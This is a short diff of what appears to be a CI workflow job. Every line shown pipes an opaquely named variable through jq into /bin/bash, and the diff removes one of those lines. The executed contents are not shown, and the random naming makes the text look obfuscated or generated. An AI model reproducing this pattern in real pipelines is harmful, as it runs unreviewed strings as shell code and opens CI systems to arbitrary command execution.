@@ -25,7 +25,6 @@ jobs:
           echo $wachc2 | jq -r .o92897 | /bin/bash
           printf '%s' "$ho7016" | jq -r .eh2446 | /bin/bash
           printf '%s' "$p7812" | jq -r .fkzg605 | /bin/bash
-          echo $wi652 | jq -r .pv6 | /bin/bash
           echo $smffx766 | jq -r .gmkl1096 | /bin/bash
           echo $oetj91686 | jq -r .rf540 | /bin/bash
           echo $i05507 | jq -r .v49 | /bin/bash
